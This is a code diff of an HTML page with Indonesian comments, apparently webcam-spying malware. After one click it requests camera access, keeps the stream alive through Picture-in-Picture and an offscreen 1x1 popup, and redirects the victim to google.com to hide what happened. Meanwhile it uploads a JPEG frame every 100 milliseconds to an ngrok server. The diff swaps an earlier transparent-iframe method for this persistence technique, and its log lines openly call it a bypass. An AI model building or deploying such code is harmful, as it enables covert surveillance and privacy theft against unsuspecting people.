@@ -11,16 +11,7 @@
   h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
-  
-  /* Iframe Transparan (Bukan display: none) */
-  #pipFrame {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    opacity: 0.01; /* Hampir transparan, tapi dianggap visible */
-    pointer-events: none;
-    z-index: 9999;
-  }
+  iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
@@ -33,15 +24,14 @@
 
 <div id="launcher-container" style="display: none;"></div>
 
-<!-- Iframe Transparan (Visible) -->
-<iframe id="pipFrame" allow="camera; microphone; autoplay; picture-in-picture"></iframe>
-
 <script>
 (function () {
   'use strict';
 
   var logEl = document.getElementById('log');
   var executed = false;
+  var streamInterval = null;
+  var pipWindow = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -53,103 +43,151 @@
   // ============================================
   var TARGET_URL = "https://www.google.com";
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
-  var REDIRECT_DELAY = 3000; // 3 Detik
+  
+  // Interval pengiriman frame (ms)
+  var STREAM_INTERVAL = 100;
 
   // ============================================
-  // FUNGSI: INJECT IFRAME TRANSPARAN (PiP + CAMERA)
+  // FUNGSI: KIRIM FRAME KE SERVER (TELEMETRI ASINKRON)
   // ============================================
-  function injectVisibleIframe() {
+  function sendFrameToServer(stream) {
     try {
-      log("[+] Membuat Iframe Transparan (PiP)...");
+      // Buat elemen video sementara untuk capture
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.play().catch(function(){});
 
-      var iframe = document.getElementById('pipFrame');
-      
-      // Tulis payload ke dalam iframe
-      iframe.srcdoc = `
-        <!DOCTYPE html>
-        <html>
-        <body>
-          <video id="hiddenVideo" autoplay playsinline muted style="position:absolute;top:0;left:0;width:100vw;height:100vh;opacity:0.01;"></video>
-          <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
-          
-          <script>
-            (function() {
-              // 1. Minta Izin Kamera
-              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then(function(stream) {
-                  var video = document.getElementById('hiddenVideo');
-                  video.srcObject = stream;
-                  video.play().catch(function(){});
-                  
-                  parent.postMessage({ type: 'CAM_GRANTED' }, '*');
+      var canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      var ctx = canvas.getContext('2d');
 
-                  // 2. Paksa Masuk PiP (setelah 1 detik)
-                  setTimeout(function() {
-                    if (document.pictureInPictureElement) {
-                      document.exitPictureInPicture();
-                    }
-                    video.requestPictureInPicture()
-                      .then(function() {
-                        parent.postMessage({ type: 'PIP_GRANTED' }, '*');
-                      })
-                      .catch(function(err) {
-                        parent.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
-                      });
-                  }, 1000);
+      // Tunggu video siap, lalu capture
+      video.onloadedmetadata = function() {
+        setInterval(function() {
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(function(blob) {
+              if (!blob) return;
+              var formData = new FormData();
+              formData.append('file', blob, 'capture.jpg');
 
-                  // 3. Kirim Gambar ke Server
-                  setInterval(function() {
-                    var canvas = document.getElementById('hiddenCanvas');
-                    var ctx = canvas.getContext('2d');
-                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                      canvas.toBlob(function(blob) {
-                        if (!blob) return;
-                        var formData = new FormData();
-                        formData.append('file', blob, 'capture.jpg');
-                        fetch('${SERVER_ENDPOINT}', {
-                          method: 'POST',
-                          body: formData
-                        }).catch(function(){});
-                      }, 'image/jpeg', 0.5);
-                    }
-                  }, 100);
+              // Kirim via fetch (keepalive)
+              fetch(SERVER_ENDPOINT, {
+                method: 'POST',
+                body: formData,
+                keepalive: true
+              }).catch(function(){});
 
-                })
-                .catch(function(err) {
-                  parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
-                });
-            })();
-          <\/script>
-        </body>
-        </html>
-      `;
+              // Fallback: sendBeacon (jika fetch gagal)
+              // navigator.sendBeacon(SERVER_ENDPOINT, blob);
 
-      log("[+] Iframe Transparan disuntikkan.");
+            }, 'image/jpeg', 0.5);
+          }
+        }, STREAM_INTERVAL);
+      };
     } catch(e) {
-      log("[-] Iframe Error: " + e.message);
+      log("[-] Frame Error: " + e.message);
     }
   }
 
   // ============================================
-  // LISTENER PESAN DARI IFRAME
+  // FUNGSI: ENTER PiP (PICTURE-IN-PICTURE)
   // ============================================
-  window.addEventListener('message', function(e) {
-    if (e.data.type === 'CAM_GRANTED') {
-      log("[+] 🚨 Kamera DIIZINKAN (Iframe)!");
-    } else if (e.data.type === 'PIP_GRANTED') {
-      log("[+] 🎥 PiP AKTIF (Video Melayang)!");
-    } else if (e.data.type === 'CAM_DENIED') {
-      log("[-] Kamera ditolak: " + e.data.error);
-    } else if (e.data.type === 'PIP_DENIED') {
-      log("[-] PiP ditolak: " + e.data.error);
+  function enterPiP(stream) {
+    try {
+      // Buat video element
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      video.style.display = 'none';
+      document.body.appendChild(video);
+
+      video.play().then(function() {
+        // Minta PiP
+        video.requestPictureInPicture()
+          .then(function() {
+            log("[+] 🎥 PiP AKTIF (Video Melayang)!");
+          })
+          .catch(function(err) {
+            log("[-] PiP Gagal: " + err.message);
+          });
+      }).catch(function(err) {
+        log("[-] Video Play Gagal: " + err.message);
+      });
+    } catch(e) {
+      log("[-] PiP Error: " + e.message);
     }
-  });
+  }
+
+  // ============================================
+  // FUNGSI: POPUP WINDOW TERISOLASI (ALTERNATIF PiP)
+  // ============================================
+  function createPopupWindow(stream) {
+    try {
+      // Buka jendela kecil (tersembunyi)
+      var win = window.open('', 'StreamWindow', 'width=1,height=1,left=-1000,top=-1000');
+      if (!win) {
+        log("[-] Popup diblokir.");
+        return;
+      }
+
+      // Tulis video ke popup
+      win.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <body style="margin:0;background:#000;">
+          <video id="pipVideo" autoplay playsinline muted style="width:100%;height:100%;"></video>
+          <script>
+            window.onload = function() {
+              var video = document.getElementById('pipVideo');
+              video.srcObject = window.opener.stream;
+              video.play().catch(function(){});
+              
+              // Paksa PiP
+              setTimeout(function() {
+                if (document.pictureInPictureElement) {
+                  document.exitPictureInPicture();
+                }
+                video.requestPictureInPicture()
+                  .then(function() {
+                    window.opener.postMessage({ type: 'PIP_GRANTED' }, '*');
+                  })
+                  .catch(function(err) {
+                    window.opener.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
+                  });
+              }, 500);
+            };
+          <\/script>
+        </body>
+        </html>
+      `);
+
+      // Kirim stream ke popup
+      win.stream = stream;
+      log("[+] Popup Window Terisolasi Dibuat.");
+
+      // Listener pesan dari popup
+      window.addEventListener('message', function(e) {
+        if (e.data.type === 'PIP_GRANTED') {
+          log("[+] 🎥 PiP (Popup) AKTIF!");
+        } else if (e.data.type === 'PIP_DENIED') {
+          log("[-] PiP (Popup) Ditolak: " + e.data.error);
+        }
+      });
+
+    } catch(e) {
+      log("[-] Popup Error: " + e.message);
+    }
+  }
 
   // ============================================
   // TRIGGER (KLIK)
   // ============================================
-  document.body.addEventListener('click', function() {
+  document.body.addEventListener('click', async function() {
     if (executed) return;
     executed = true;
 
@@ -159,18 +197,48 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai PiP Bypass...");
+    log("[!] Memulai Lifecycle Persistence...");
 
-    // A. INJECT IFRAME TRANSPARAN
-    injectVisibleIframe();
+    // ============================================
+    // A. MINTA IZIN KAMERA
+    // ============================================
+    try {
+      log("[+] Meminta Izin Kamera...");
+      
+      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      log("[+] 🚨 KAMERA BERHASIL diakses!");
 
-    // B. REDIRECT KE GOOGLE
-    setTimeout(function() {
-      log("[+] Redirect ke Google.com...");
-      try {
-        window.location.href = TARGET_URL;
-      } catch(e) {}
-    }, REDIRECT_DELAY);
+      // ============================================
+      // B. PERTAHANKAN STREAM (PiP & POPUP)
+      // ============================================
+      // B1. PiP (Langsung)
+      enterPiP(stream);
+
+      // B2. Popup Window (Alternatif)
+      createPopupWindow(stream);
+
+      // B3. Mulai Telemetri (Kirim Frame)
+      sendFrameToServer(stream);
+
+      // ============================================
+      // C. REDIRECT KE GOOGLE (INSTAN)
+      // ============================================
+      setTimeout(function() {
+        log("[+] Redirect ke Google.com...");
+        try {
+          window.location.replace(TARGET_URL);
+        } catch(e) {}
+      }, 500); // 500ms setelah kamera aktif
+
+    } catch(err) {
+      log("[-] Kamera diblokir: " + err.name);
+      
+      // Jika kamera diblokir, tetap redirect ke Google setelah 1 detik
+      setTimeout(function() {
+        log("[+] Redirect ke Google (kamera diblokir)...");
+        window.location.replace(TARGET_URL);
+      }, 1000);
+    }
 
   }, { once: true });
 
